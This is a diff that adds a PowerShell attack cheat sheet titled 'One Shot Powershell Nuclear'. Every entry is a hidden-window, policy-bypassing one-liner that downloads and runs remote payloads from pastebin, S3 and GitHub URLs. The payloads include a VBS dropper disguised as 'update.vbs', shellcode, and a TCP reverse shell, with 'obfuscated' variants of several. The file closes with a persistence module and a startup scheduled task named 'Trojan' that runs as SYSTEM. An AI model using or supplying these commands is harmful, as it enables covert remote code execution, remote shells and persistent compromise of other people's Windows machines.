@@ -1,0 +1,54 @@
+
+**************************************One Shot Powershell Nuclear*********************************************
+**************************************************************************************************************
+
+--------------------------------------------------escalating priv hak5 ---------
+powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('https://pastebin.com/raw/YcXygagz', '%temp%/update.vbs'); %temp%/update.vbs
+
+
+
+
+--------------------------------------------powershell_download_and Execute ps1-------------
+powershell -windowstyle hidden "IEX (New-Object Net.WebClient).DownloadString('https://s3.ap-south-1.amazonaws.com/giros/exe/ps_shellcode_bmp_DKMC.ps1');"
+
+>>>>>>>>>>OBFUSCATED>>>>>>>>
+powershell -W hidden -NoLogo -NonInteractive -ep bypass -nop -c "IEX (New-Object Net.WebClient).DownloadString('https://s3.ap-south-1.amazonaws.com/giros/exe/ps_shellcode_bmp_DKMC.ps1');"
+
+
+>>>>>>>>>>>OBFUSCATED>>>>>>>>>
+powershell -windowstyle hidden -NoLogo -NonInteractive -ep bypass -nop -c "IEX (New-Object Net.WebClient).DownloadString('https://s3.ap-south-1.amazonaws.com/giros/exe/ps_shellcode_bmp_DKMC.ps1');"
+
+
+
+
+
+
+
+---------Tcp_Nishan_reverse shell------------
+powershell -windowstyle hidden "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/vulware/powershell-reverse-shell-/master/powershell%20tcp%20reverse%20shell.ps1');"
+
+
+
+
+
+
+powershell -W hidden -NoLogo -NonInteractive -ep bypass -nop -c (new-object System.Net.WebClient).DownloadFile('https://pastebin.com/raw/YcXygagz', '%temp%/update.vbs'); %temp%/update.vbs
+
+
+<<<<<<<<<<<<<<Older<<<<<<<<<<<<<<<<<<<
+powershell -windowstyle hidden "IEX (new-object System.Net.WebClient).DownloadFile('https://pastebin.com/raw/YcXygagz', '%temp%/save.vbs'); Start-Process ‘%Temp%\save.vbs’"
+
+//powershell -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object System.Net.WebClient).DownloadFile('https://pastebin.com/raw/YcXygagz',\"$env:temp\YcXygagz.vbs"); Start-Process \"$env:temp\YcXygagz.vbs""
+
+
+>>>>>persistence>>>>>>
+powershell.exe -window hidden -exec bypass -noni -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/vulware/scripts/master/powershell-persistence.ps1'); Add-Persistence https://raw.githubusercontent.com/vulware/scripts/master/unicorn_shell_8080.txt"
+
+
+
+Scheduled tasks: A new task can be created that will
+execute a PowerShell command at specific trigger
+moments. 
+
+For example:
+schtasks /create /tn Trojan /tr “powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c ‘IEX ((new-objectnet.webclient).downloadstring(‘’https://pastebin.com/raw/YcXygagz’’))’” /sc onstart /ru System
